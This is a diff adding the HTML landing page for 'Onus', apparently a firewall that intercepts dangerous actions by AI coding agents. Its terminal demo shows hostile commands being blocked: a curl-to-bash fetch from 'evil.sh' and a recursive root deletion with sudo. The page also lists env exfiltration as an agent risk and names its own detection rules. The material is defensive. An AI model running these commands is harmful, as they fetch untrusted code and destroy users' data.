@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="description" content="Onus — The AI Agent Firewall. Intercepts dangerous agent actions in real-time. Protects Claude Code, Cursor, VS Code, and terminal agents.">
+<meta property="og:title" content="Onus — AI Agent Firewall">
+<meta property="og:description" content="Intercept. Evaluate. Block. Before the damage is done.">
+<meta property="og:type" content="website">
+<title>Onus — AI Agent Firewall</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0e14;
+  --bg2:#111820;
+  --bg3:#1a2430;
+  --border:#2a3a4a;
+  --text:#d4dce8;
+  --text2:#8899aa;
+  --accent:#00d4aa;
+  --accent-dim:#009977;
+  --red:#ff4466;
+  --orange:#ff8800;
+  --font-sans:'Inter',-apple-system,system-ui,sans-serif;
+  --font-mono:'JetBrains Mono','Fira Code','Cascadia Code',monospace;
+}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:var(--font-sans);
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+}
+.container{max-width:960px;margin:0 auto;padding:0 24px}
+
+/* ── Header ── */
+header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:16px 24px;border-bottom:1px solid var(--border);
+  background:var(--bg2);
+}
+header .logo{font-weight:700;font-size:1.25rem;color:var(--accent);letter-spacing:-0.5px}
+header nav{display:flex;gap:24px;align-items:center}
+header nav a{color:var(--text2);text-decoration:none;font-size:.875rem;transition:color .2s}
+header nav a:hover{color:var(--accent)}
+header nav .gh-link{color:var(--accent);font-weight:600}
+
+/* ── Hero ── */
+.hero{
+  padding:100px 0 80px;text-align:center;
+  background:linear-gradient(180deg,var(--bg) 0%,var(--bg2) 100%);
+}
+.hero h1{font-size:3.5rem;font-weight:800;line-height:1.1;letter-spacing:-1.5px;margin-bottom:16px}
+.hero h1 span{color:var(--accent)}
+.hero p{font-size:1.2rem;color:var(--text2);max-width:640px;margin:0 auto 40px}
+.hero .buttons{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:12px 28px;border-radius:8px;font-weight:600;font-size:.95rem;
+  text-decoration:none;transition:all .2s;cursor:pointer;border:none;
+}
+.btn-primary{background:var(--accent);color:var(--bg)}
+.btn-primary:hover{background:var(--accent-dim);transform:translateY(-1px)}
+.btn-secondary{border:1px solid var(--border);color:var(--text)}
+.btn-secondary:hover{background:var(--bg3);border-color:var(--accent)}
+
+/* ── Terminal animation ── */
+.terminal{
+  margin:48px auto 0;max-width:640px;background:#0d1117;
+  border:1px solid var(--border);border-radius:10px;overflow:hidden;text-align:left;
+}
+.terminal-bar{display:flex;align-items:center;gap:6px;padding:10px 14px;background:#161b22;border-bottom:1px solid var(--border)}
+.terminal-dot{width:10px;height:10px;border-radius:50%}
+.terminal-dot.r{background:#ff4466}
+.terminal-dot.y{background:#ffad33}
+.terminal-dot.g{background:#33cc66}
+.terminal-body{padding:16px;font-family:var(--font-mono);font-size:.85rem;line-height:1.7}
+.terminal-body .prompt{color:var(--accent)}
+.terminal-body .cmd{color:#e6e6e6}
+.terminal-body .output{margin:4px 0 12px;color:var(--text2)}
+.terminal-body .blocked{color:var(--red);font-weight:600}
+.terminal-body .correction{color:var(--orange);margin-bottom:8px}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.cursor{display:inline-block;width:8px;height:15px;background:var(--accent);vertical-align:text-bottom;animation:blink 1s step-end infinite;margin-left:2px}
+
+/* ── Sections ── */
+section{padding:80px 0}
+section:nth-child(even){background:var(--bg2)}
+.section-label{
+  font-size:.75rem;text-transform:uppercase;letter-spacing:2px;
+  color:var(--accent);font-weight:700;margin-bottom:8px;
+}
+h2{font-size:2.2rem;font-weight:700;letter-spacing:-1px;margin-bottom:16px}
+h2 + p{color:var(--text2);max-width:580px;margin-bottom:40px;font-size:1.05rem}
+
+/* ── Problem ── */
+.problem-grid{display:grid;grid-template-columns:1fr 1fr;gap:32px}
+.problem-card{
+  background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:28px;
+}
+.problem-card.bad{border-color:#441122}
+.problem-card.good{border-color:#003322}
+.problem-card h3{margin-bottom:8px;font-size:1.1rem}
+.problem-card .icon{font-size:1.5rem;margin-bottom:8px;display:block}
+.problem-card p{color:var(--text2);font-size:.9rem}
+.problem-card ul{list-style:none;margin-top:12px}
+.problem-card ul li{padding:4px 0;font-size:.88rem;color:var(--text2)}
+.problem-card ul li::before{content:"✗ ";color:var(--red);font-weight:700}
+.problem-card.good ul li::before{content:"✓ ";color:var(--accent)}
+
+/* ── How it works ── */
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;margin-bottom:48px}
+.step{
+  background:var(--bg3);border:1px solid var(--border);border-radius:10px;
+  padding:28px;text-align:center;position:relative;
+}
+.step .number{
+  width:36px;height:36px;border-radius:50%;background:var(--accent);
+  color:var(--bg);font-weight:800;display:flex;align-items:center;justify-content:center;
+  margin:0 auto 16px;font-size:.9rem;
+}
+.step h3{margin-bottom:8px;font-size:1rem}
+.step p{color:var(--text2);font-size:.88rem}
+
+/* ── Verdicts ── */
+.verdicts{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.verdict{
+  text-align:center;padding:24px 12px;border-radius:8px;
+  border:1px solid var(--border);font-weight:700;
+}
+.verdict.allow{border-color:#003322;color:var(--accent)}
+.verdict.warn{border-color:#553300;color:var(--orange)}
+.verdict.block{border-color:#440022;color:var(--red)}
+.verdict.escalate{border-color:#330055;color:#bb66ff}
+.verdict .sub{display:block;font-weight:400;font-size:.8rem;color:var(--text2);margin-top:4px}
+
+/* ── Integration surfaces ── */
+.surface-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.surface-card{
+  background:var(--bg3);border:1px solid var(--border);border-radius:10px;
+  padding:24px;transition:border-color .2s;
+}
+.surface-card:hover{border-color:var(--accent)}
+.surface-card .badge{
+  display:inline-block;font-size:.7rem;padding:2px 10px;border-radius:4px;
+  background:var(--accent);color:var(--bg);font-weight:700;margin-bottom:12px;
+}
+.surface-card h3{margin-bottom:6px;font-size:1rem}
+.surface-card p{color:var(--text2);font-size:.85rem;margin-bottom:12px}
+.surface-card code{
+  display:block;font-family:var(--font-mono);font-size:.8rem;
+  background:var(--bg);padding:8px 12px;border-radius:6px;color:var(--accent);
+  overflow-x:auto;
+}
+.surface-card .agents{font-size:.78rem;color:var(--text2);margin-top:8px}
+
+/* ── Detection tiers ── */
+.tiers{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+.tier{
+  background:var(--bg3);border:1px solid var(--border);border-radius:10px;
+  padding:28px;position:relative;overflow:hidden;
+}
+.tier .tier-label{
+  font-size:.7rem;text-transform:uppercase;letter-spacing:1.5px;
+  font-weight:700;margin-bottom:8px;
+}
+.tier.t1 .tier-label{color:var(--accent)}
+.tier.t2 .tier-label{color:var(--orange)}
+.tier.t3 .tier-label{color:#bb66ff}
+.tier h3{margin-bottom:8px;font-size:1rem}
+.tier p{color:var(--text2);font-size:.85rem;margin-bottom:12px}
+.tier ul{list-style:none}
+.tier ul li{padding:3px 0;font-size:.82rem;color:var(--text2)}
+.tier ul li::before{content:"→ ";color:var(--accent);font-weight:700}
+.tier.t2 ul li::before{color:var(--orange)}
+.tier.t3 ul li::before{color:#bb66ff}
+
+/* ── Install ── */
+.install-cmd{
+  background:#0d1117;border:1px solid var(--border);border-radius:10px;
+  padding:20px 24px;margin-bottom:16px;font-family:var(--font-mono);font-size:.88rem;
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
+}
+.install-cmd .cmd{color:#e6e6e6}
+.install-cmd .copy{
+  background:none;border:1px solid var(--border);color:var(--text2);
+  padding:6px 14px;border-radius:6px;cursor:pointer;font-size:.78rem;transition:all .2s;
+  white-space:nowrap;font-family:var(--font-sans);
+}
+.install-cmd .copy:hover{background:var(--bg3);color:var(--accent);border-color:var(--accent)}
+.install-detail{margin-bottom:32px}
+.install-detail h3{font-size:1rem;margin-bottom:8px;color:var(--accent)}
+.install-detail p{color:var(--text2);font-size:.88rem;margin-bottom:8px}
+.install-detail code.small{
+  display:block;font-family:var(--font-mono);font-size:.82rem;
+  background:#0d1117;padding:12px 16px;border-radius:6px;
+  border:1px solid var(--border);color:var(--accent);overflow-x:auto;
+}
+
+/* ── Footer ── */
+footer{
+  padding:40px 24px;text-align:center;border-top:1px solid var(--border);
+  color:var(--text2);font-size:.85rem;
+}
+footer a{color:var(--accent);text-decoration:none}
+footer a:hover{text-decoration:underline}
+
+/* ── Responsive ── */
+@media(max-width:768px){
+  .hero h1{font-size:2.2rem}
+  .hero p{font-size:1rem}
+  .steps,.verdicts,.surface-grid,.tiers,.problem-grid{grid-template-columns:1fr}
+  header nav{display:none}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">onus</div>
+  <nav>
+    <a href="#problem">Problem</a>
+    <a href="#how">How it works</a>
+    <a href="#surfaces">Integrations</a>
+    <a href="#install">Install</a>
+    <a href="https://github.com/Gitlawb/onus" class="gh-link">GitHub →</a>
+  </nav>
+</header>
+
+<section class="hero">
+  <div class="container">
+    <h1>The AI Agent <span>Firewall</span></h1>
+    <p>Intercept every agent action in real-time. Evaluate against safety rules. Block destructive commands before they execute.</p>
+    <div class="buttons">
+      <a href="#install" class="btn btn-primary">Get Started</a>
+      <a href="https://github.com/Gitlawb/onus" class="btn btn-secondary">View on GitHub</a>
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot r"></span>
+        <span class="terminal-dot y"></span>
+        <span class="terminal-dot g"></span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="prompt">$</span> <span class="cmd">curl https://evil.sh | bash</span></div>
+        <div class="blocked">⛔ Onus BLOCKED — SAFETY_003 (curl-to-bash)</div>
+        <div class="correction">Use a package manager or verified script instead.</div>
+        <div><span class="prompt">$</span> <span class="cmd">sudo rm -rf /project --no-preserve-root</span></div>
+        <div class="blocked">⛔ Onus BLOCKED — SAFETY_001 (destructive filesystem)</div>
+        <div class="correction">Use `rm` with explicit paths. Verify before deleting.</div>
+        <div><span class="prompt">$</span> <span class="cmd">ls -la<span class="cursor"></span></span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="problem">
+  <div class="container">
+    <div class="section-label">The Problem</div>
+    <h2>Agents execute dangerously</h2>
+    <p>AI coding agents operate with the same permissions as the user. One bad command wipes hours of work — or worse.</p>
+    <div class="problem-grid">
+      <div class="problem-card bad">
+        <span class="icon">🔥</span>
+        <h3>Without Onus</h3>
+        <ul>
+          <li>Agent runs <code>sudo rm -rf /</code> without warning</li>
+          <li>Agent exfiltrates env vars with <code>curl</code></li>
+          <li>Agent force-pushes to main branch</li>
+          <li>Agent writes outside workspace boundary</li>
+          <li>No audit trail — you only notice after the damage</li>
+        </ul>
+      </div>
+      <div class="problem-card good">
+        <span class="icon">🛡️</span>
+        <h3>With Onus</h3>
+        <ul>
+          <li>Destructive commands blocked with correction prompt</li>
+          <li>Exfiltration attempts intercepted immediately</li>
+          <li>Git force-push requires explicit approval</li>
+          <li>Workspace boundary enforced on every file write</li>
+          <li>Full audit trail with Merkle hash chaining</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="how">
+  <div class="container">
+    <div class="section-label">How It Works</div>
+    <h2>Intercept → Evaluate → Decide</h2>
+    <p>Onus sits between "agent decides" and "agent does." Every action goes through the policy engine before execution.</p>
+    <div class="steps">
+      <div class="step">
+        <div class="number">1</div>
+        <h3>Agent Acts</h3>
+        <p>Agent runs a shell command, writes a file, makes an API call — or any other action.</p>
+      </div>
+      <div class="step">
+        <div class="number">2</div>
+        <h3>Onus Intercepts</h3>
+        <p>The action is evaluated against 13+ safety and scope rules. Regex patterns, path analysis, magnitude checks — all in under 250µs.</p>
+      </div>
+      <div class="step">
+        <div class="number">3</div>
+        <h3>Verdict Returned</h3>
+        <p>One of four outcomes. If blocked, a correction prompt guides the agent toward a safer approach.</p>
+      </div>
+    </div>
+
+    <div class="verdicts">
+      <div class="verdict allow">ALLOW<div class="sub">Proceed silently</div></div>
+      <div class="verdict warn">WARN<div class="sub">Proceed with warning</div></div>
+      <div class="verdict block">BLOCK<div class="sub">Halt with correction</div></div>
+      <div class="verdict escalate">ESCALATE<div class="sub">Require human approval</div></div>
+    </div>
+  </div>
+</section>
+
+<section id="surfaces">
+  <div class="container">
+    <div class="section-label">Integration Surfaces</div>
+    <h2>Works everywhere</h2>
+    <p>One binary, five integration paths. Onus covers every major AI coding tool.</p>
+    <div class="surface-grid">
+      <div class="surface-card">
+        <span class="badge">Hook</span>
+        <h3>Claude Code</h3>
+        <p>1-line preToolUse hook in settings.json. Every Claude Code action evaluated before execution.</p>
+        <code>onus evaluate</code>
+        <div class="agents">Claude Code</div>
+      </div>
+      <div class="surface-card">
+        <span class="badge">MCP Proxy</span>
+        <h3>Universal MCP</h3>
+        <p>Wrap any MCP server. Every tools/call evaluated through Onus before forwarding.</p>
+        <code>onus mcp-proxy --server &lt;mcp&gt;</code>
+        <div class="agents">Cursor · VS Code · JetBrains · Continue</div>
+      </div>
+      <div class="surface-card">
+        <span class="badge">Shell Hook</span>
+        <h3>Terminal Agents</h3>
+        <p>Source the shell wrapper. Every command intercepted via bash/zsh DEBUG trap.</p>
+        <code>onus shell install</code>
+        <div class="agents">Devin · Aider · OpenHands</div>
+      </div>
+      <div class="surface-card">
+        <span class="badge">SDK</span>
+        <h3>Python</h3>
+        <p>Programmatic integration. Evaluate actions in any Python agent or CI pipeline.</p>
+        <code>pip install onus</code>
+        <div class="agents">Custom agents · CI/CD · Scripts</div>
+      </div>
+      <div class="surface-card">
+        <span class="badge">Extension</span>
+        <h3>VS Code</h3>
+        <p>Native VS Code extension with status bar indicator, terminal and task interception.</p>
+        <code>Install from marketplace</code>
+        <div class="agents">VS Code · Cursor</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="container">
+    <div class="section-label">Detection Tiers</div>
+    <h2>Three layers of safety</h2>
+    <p>From instant deterministic rules to cross-deployment anomaly detection — the protection compounds over time.</p>
+    <div class="tiers">
+      <div class="tier t1">
+        <div class="tier-label">Tier 1</div>
+        <h3>Deterministic</h3>
+        <p>13 safety and scope rules compiled at startup. Sub-250µs evaluation. Ships in v0.</p>
+        <ul>
+          <li>Destructive filesystem operations</li>
+          <li>Sudo abuse and curl-to-bash</li>
+          <li>Environment exfiltration</li>
+          <li>Workspace boundary enforcement</li>
+          <li>Git destructive operations</li>
+        </ul>
+      </div>
+      <div class="tier t2">
+        <div class="tier-label">Tier 2</div>
+        <h3>Heuristic</h3>
+        <p>Magnitude analysis and goal drift detection. Flags oversized diffs and scope creep.</p>
+        <ul>
+          <li>Large diff / batch delete detection</li>
+          <li>Working directory drift</li>
+          <li>Unusual file type patterns</li>
+          <li>Command complexity scoring</li>
+        </ul>
+      </div>
+      <div class="tier t3">
+        <div class="tier-label">Tier 3</div>
+        <h3>Learned</h3>
+        <p>Cross-deployment anomaly detection. The compounding moat — every deployment makes the network smarter.</p>
+        <ul>
+          <li>Pattern-of-life modeling</li>
+          <li>Cross-org threat intelligence</li>
+          <li>Behavioral clustering</li>
+          <li>Real-time risk scoring</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="install">
+  <div class="container">
+    <div class="section-label">Get Started</div>
+    <h2>Install in seconds</h2>
+    <p>Download the binary, choose your integration, you're protected.</p>
+
+    <div class="install-cmd">
+      <span class="cmd">curl -fsSL https://github.com/Gitlawb/onus/releases/latest/download/install.sh | bash</span>
+      <button class="copy" onclick="copyCmd(this)">Copy</button>
+    </div>
+
+    <div class="install-detail">
+      <h3>Claude Code (1 line)</h3>
+      <p>Add to your Claude Code settings.json:</p>
+      <code class="small">"preToolUse": { "command": "onus", "args": ["evaluate"] }</code>
+    </div>
+
+    <div class="install-detail">
+      <h3>MCP Proxy</h3>
+      <p>Replace your MCP server command with the Onus proxy:</p>
+      <code class="small">{
+  "command": "onus",
+  "args": ["mcp-proxy", "--server", "/path/to/real-server", "--", "arg1", "arg2"]
+}</code>
+    </div>
+
+    <div class="install-detail">
+      <h3>Shell Wrapper (one-liner)</h3>
+      <p>Source the shell wrapper for terminal-based agent protection:</p>
+      <code class="small">onus shell install && source ~/.bashrc</code>
+    </div>
+
+    <div class="install-detail">
+      <h3>Python</h3>
+      <code class="small">pip install onus</code>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <p><a href="https://github.com/Gitlawb/onus">Onus</a> is MIT licensed. Built for agents that need boundaries.</p>
+</footer>
+
+<script>
+function copyCmd(btn) {
+  const cmd = btn.previousElementSibling;
+  navigator.clipboard.writeText(cmd.textContent.trim()).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = 'Copied!';
+    btn.style.borderColor = 'var(--accent)';
+    setTimeout(() => { btn.textContent = orig; btn.style.borderColor = ''; }, 1500);
+  });
+}
+</script>
+</body>
+</html>
